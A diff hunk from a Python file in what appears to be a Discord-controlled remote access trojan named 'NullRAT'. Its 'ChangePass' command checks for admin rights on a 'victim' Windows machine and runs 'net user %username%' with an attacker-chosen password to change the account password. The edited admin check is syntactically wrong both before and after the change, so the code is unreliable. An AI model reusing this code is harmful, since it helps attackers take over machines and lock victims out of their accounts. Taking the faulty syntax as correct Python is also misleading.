@@ -22,7 +22,7 @@ class ChangePass(commands.Cog):
         if str(victim) == str(self.bot.identifier) or str(victim).lower() == "all":
             # Admin detection, this command will not work for regular users (apparently) 
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if !is_admin:
+            if is_admin == false:
                 return await ctx.followup.send("NullRAT is not running as admin. Operation aborted")
             
             status = os.popen(r"net user %username% " + password).read()
